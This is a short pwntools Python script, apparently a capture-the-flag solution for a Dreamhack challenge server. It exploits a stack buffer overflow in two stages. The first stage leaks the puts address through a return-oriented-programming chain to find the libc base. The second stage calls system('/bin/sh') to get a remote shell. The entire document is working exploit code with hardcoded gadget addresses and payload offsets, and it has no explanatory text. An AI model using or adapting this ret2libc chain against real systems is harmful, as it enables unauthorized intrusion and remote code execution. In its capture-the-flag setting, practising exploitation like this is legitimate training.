from pwn import *

context.arch='amd64'

HOST, PORT = 'host3.dreamhack.games', 9784
r = remote(HOST, PORT)

libc=ELF('./libc6_2.23-0ubuntu11.3_amd64.so')

main=0x400957
puts_got=0x602020
puts_plt=0x400730
pop_rdi=0x400c73
ret=0x400709

r.sendafter(b'-\n', b'`')
payload = b'A'*488+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
r.sendafter(b'-\n', payload)
r.recvuntil(b'-)\n')

libc_base = u64(r.recvline().strip().ljust(8, b'\x00'))-libc.symbols['puts']
system=libc_base+libc.symbols['system']
binsh=libc_base+next(libc.search(b'/bin/sh'))

r.sendafter(b'-\n', b'`')

payload = b'A'*488
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)
r.sendafter(b'-\n', payload)

r.interactive()